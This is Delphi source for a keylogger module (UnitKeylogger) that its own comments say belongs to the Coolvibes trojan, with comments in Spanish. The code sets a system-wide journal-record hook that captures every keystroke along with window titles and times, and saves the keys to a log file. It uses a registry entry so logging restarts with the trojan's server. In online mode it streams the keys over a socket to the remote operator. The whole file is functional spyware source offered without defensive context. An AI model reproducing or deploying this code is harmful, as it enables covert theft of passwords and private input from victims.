{Unit perteneciente al troyano Coolvibes que contiene el modulo keylogger, la base a sido extraida
de http://www.opensc.ws/snippets/204-keylogger.html by stm}

unit UnitKeylogger;

interface

uses
  Windows,
  Messages,
  UnitWindows,
  SocketUnit,
  UnitVariables,
  minireg,
  Sysutils;
  
  procedure OnServerInitKeylogger();//Al iniciar el servidor...
  procedure EmpezarKeylogger(ArchivoLog:string); //Empezar a "loggear" teclas
  procedure SetOnlineKeylogger(status:boolean;client:TclientSocket);   //activar o desactivar online keylogger
  procedure PararKeylogger();                    //Parar de "loggear" teclas
  function ObtenerEstadoKeylogger():boolean;     //Para saber si está activado o desactivado
  function ObtenerLog():string;                  //devuelve el log 
  function GetOnlineKeyloggerKeys():string;  //Las nuevas letras pulsadas
  procedure EliminarLog();                       //Eliminar el log del keylogger
  procedure KlogThread();                        //thread principal del keylogger
  function JHProc(nCode: integer; wParam: Longint; var EventStrut: TEVENTMSG): Longint;stdcall; //HOOK que añade las teclas pulsadas a CapturarTecla
  procedure KeyHook();                           //Crea el HOOK
  function GetKeyloggerPath():string;

  
implementation
var
  KeyloggerActivado    : boolean;
  KeyloggerPath        : string;
  AccediendoKeylogger  : boolean; //saber si se intenta acceder al archivo
  TeclasPulsadas       : string;  //teclas pulsadas, se eliminan al guardar el log
  lasttickcount        : integer; //última vez guardado
  lasttickcountv       : integer; //última vez guardado
  ThreadStarted        : boolean;
  id1                  : longword;
  id2                  : longword;
  Evento               : string;
  CapturarTecla        : string;
  HookHandle           : HHook;
  JHHandle             : HHook;
  lpMsg                : TMsg;
  letraanterior        : integer;
  OKeyloggerActivado   : Boolean;  //Estado del online keylogger
  OnlineKeyloggerKeys  : string;
  lasttickcounton      : integer; //Ultima vez mandadas teclas del online keylogger
  Cliente              : TClientSocket;


procedure OnServerInitKeylogger();//Al iniciar el servidor...
var
tmp : string;
begin
  RegGetString(HKEY_CURRENT_USER, 'Software\'+Configuracion.sID+'\'+Configuracion.sID, tmp);
  if(tmp <> '') then
    empezarkeylogger(tmp); //Empezamos
end;


procedure EmpezarKeylogger(ArchivoLog:string);
begin
  KeyloggerPath := ExtractFilePath(Paramstr(0))+ArchivoLog;
  RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\'+Configuracion.sID, extractfilename(KeyloggerPath));
  if not ThreadStarted then
  begin
    ThreadStarted  := true;
    BeginThread(nil,0,Addr(KlogThread),nil,0,id1);
    BeginThread(nil,0,Addr(KeyHook),nil,0,id2);
  end;
  KeyloggerActivado := true;
end;

procedure SetOnlineKeylogger(status:boolean;client:TclientSocket);  //activar o desactivar online keylogger
begin
  OKeyloggerActivado := status;
  if(status = false) then OnlineKeyloggerKeys := '' else Cliente := client;
end;

function GetOnlineKeyloggerKeys():string;  //Las nuevas letras pulsadas
begin
  Result := OnlineKeyloggerKeys;
  OnlineKeyloggerKeys := '';
end;

procedure PararKeylogger();
begin
  KeyloggerActivado := false;
  KeyloggerPath := '';
  UnhookWindowsHookEx(HookHandle);
  HookHandle := 0;
  RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\'+Configuracion.sID, '');
end;

function ObtenerEstadoKeylogger():boolean;
begin
  Result := KeyloggerActivado;
end;

function GetKeyloggerPath():string;
begin
  Result := KeyloggerPath;
end;

function ObtenerLog():string;
var
  KlogFile : file;
  Tamano   : integer;
begin

  while(AccediendoKeylogger) do sleep(1);
  AccediendoKeylogger := true;
  if(fileexists(KeyloggerPath)) then
  begin
    FileMode := 0;  //fmopenread
    AssignFile(KlogFile, KeyloggerPath);
    Reset(KlogFile, 1);
    tamano := FileSize(KlogFile);
    SetLength(Result, tamano);
    BlockRead(KlogFile, Result[1], tamano);
    CloseFile(KlogFile);
  end;


  AccediendoKeylogger := false;

  Result := Result + TeclasPulsadas;

  if(Result = '') then Result := 'Vacio';
end;

procedure EliminarLog();
begin
  while AccediendoKeylogger do sleep(1);
  if(fileexists(KeyLoggerPath)) then
    DeleteFile(KeyloggerPath);
end;


function CifradoLog(input:string):string;
begin
//chr(ord(TmpServDLL[i]) xor strtoint(Copy(Recibido, 1, Pos('|', Recibido) - 1)));
  Result := input;
end;



procedure GuardarLog();
var
  KlogFile : textfile;
  tamano   : integer;
begin                                                                 {cada 30 segundos}
  if((Length(TeclasPulsadas) = 0) or ((GetTickCount()-lasttickcount) < 30000)) then exit;  //Nos vamos :p
  lasttickcount := GetTickCount();
  while(AccediendoKeylogger) do sleep(1);    //Esperamso a que acabe
  AccediendoKeylogger := true;


  AssignFile(KlogFile, KeyloggerPath);
  if fileexists(KeyloggerPath) then
  begin
    Append(KlogFile); //vamos al final...
  end
  else
    Rewrite(KlogFile);
  Write(KlogFile, TeclasPulsadas);
  CloseFile(KlogFile);

  TeclasPulsadas := '';//Las borramos
  AccediendoKeylogger := false;
end;

procedure KlogThread();
var
  Tecla : String;
  TituloVentana : string;
  TempTituloVentana    : string;
begin
  Evento := 'Keylogger Iniciado';
  while true do
  begin
    if(KeyloggerActivado) then
    begin

      if((gettickcount-lasttickcountv) > 100) then
      begin
          lasttickcountv := GetTickCount();
          TempTituloVentana := GetActiveWindowCaption;
      end;
      Tecla := '';
      Tecla := CapturarTecla;
      CapturarTecla := '';

      if ((Tecla <> '') and (TempTituloVentana <> TituloVentana) and (TemptituloVentana <> '')) then  //Si se pulsa tecla y cambia de ventana
      begin
        TeclasPulsadas := TeclasPulsadas +#13#10#13#10+'-{'+TempTituloVentana+'}-'+DateTimeToStr(now)+#13#10+Tecla;
        TituloVentana := TempTituloVentana;
        if(OKeyloggerActivado) then
          OnlineKeyloggerKeys := OnlineKeyloggerKeys+#13#10#13#10+'-{'+TempTituloVentana+'}-'+DateTimeToStr(now)+#13#10+Tecla;
      end
      else
      if(Tecla <> '') then
      begin
        TeclasPulsadas := TeclasPulsadas + Tecla;
        if(OKeyloggerActivado) then
          OnlineKeyloggerKeys := OnlineKeyloggerKeys + Tecla;
      end;
      
        if(Evento <> '') then
        begin
          TeclasPulsadas := TeclasPulsadas +#13#10#13#10+'-['+Evento+']- '+DateTimeToStr(now)+#13#10;
          Evento := '';
        end;
        
      sleep(80);

       if(OKeyloggerActivado and ((GetTickCount()-lasttickcounton) > 1000)) then  //Enviamos la teclas nuevas maximo cada 1000 ms para no saturar la conexión
       begin
        lasttickcounton := GetTickCount();
          if(OnlineKeyloggerKeys <> '') then //Teclas nuevas del online keylogger :D
          begin
            OnlineKeyloggerKeys:= StringReplace(OnlineKeyloggerKeys,#10, '|salto|', [rfReplaceAll]);   //Para que lo envie todo de una vez
            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,#13, '|salto2|', [rfReplaceAll]);
            OnlineKeyloggerKeys := StringReplace(OnlineKeyloggerKeys,' ', '|espacio|', [rfReplaceAll]); //Para evitar el trim(
            if(Cliente.Connected) then
              Cliente.SendString('NEWKEYLOGKEYS|'+OnlineKeyloggerKeys+ #10)
            else
              OKeyloggerActivado := false;
            OnlineKeyloggerKeys := '';
          end;
       end;
      GuardarLog();//Guardamos el log
    end
    else
    sleep(100); //Esperamos un poco...
  end;
end;


procedure KeyHook();
begin
  //HookHandle := SetWindowsHookEx(WH_JOURNALRECORD, @JHProc, HInstance, 0);
  while true  do
  begin
    lpMsg.message := WM_CANCELJOURNAL;
    if(KeyloggerActivado) then
    begin
      if((lpMsg.message = WM_CANCELJOURNAL)) then HookHandle := SetWindowsHookEx(WH_JOURNALRECORD, @JHProc, HInstance, 0);
      WaitMessage;
      GetMessage(lpMsg, 0, 0, 0);
      end
    else
      sleep(100);
  end;
end;


function JHProc(nCode: integer; wParam: Longint; var EventStrut: TEVENTMSG): Longint;stdcall;
var
  szletta: string;
  Charry: array[0..1] of Char;
  VirtKey, ScanCode: Cardinal;
  KeyState: TKeyBoardState;
  nametext: array[0..32] of Char;
begin



  if (nCode = HC_ACTION) and (EventStrut.message = WM_KEYDOWN) then
  begin
    VirtKey := LOBYTE(EventStrut.paramL);
    ScanCode := HIBYTE(EventStrut.paramL);
    ScanCode := ScanCode shl 16;
    GetKeyNameText(ScanCode, nametext, sizeof(nametext));
    szletta := #0;
    FillChar(Charry,2,#0);
    if VirtKey = VK_CAPITAL then szletta := #0
    else if VirtKey = VK_SHIFT then szletta := '[Shift]'
    else if VirtKey = VK_SPACE then szletta := ' '
    else if lstrlen(nametext) > 1 then szletta := '[' + nametext+']'
    else
    begin
      GetKeyboardState(KeyState);
      if((letraanterior = VkKeyScan('´')) OR        //Para evitar la doble tilde :D
         (letraanterior = VkKeyScan('`')) OR
         (letraanterior = VkKeyScan('¨')) OR
         (letraanterior = VkKeyScan('^')) OR
         (letraanterior = VkKeyScan('~'))) then

      begin
        szletta := chr((VirtKey)); //letra
         if(szletta = 'A') then   //habria que mirar si es ´ ¨ ~... las que estan pulsadas pero bueno no creo que sea muy relevante para nuestro idioma :p
          szletta :='á'
         else
         if(szletta = 'E') then
          szletta :='é'
         else
         if(szletta = 'I') then
          szletta :='í'
         else
         if(szletta = 'O') then
          szletta :='ó'
         else
         if(szletta = 'U') then
          szletta :='ú';
      end
      else
      begin
        ToAscii(VirtKey, ScanCode, KeyState, Charry, 0);
        szletta := Charry;
      end;
    end;
    if szletta <> '' then
      CapturarTecla := CapturarTecla+szletta;
    letraanterior := VirtKey;
  end;

  CallNextHookEx(JHHandle, nCode, wParam, Integer(@EventStrut));
  Result := 0;
end;

end.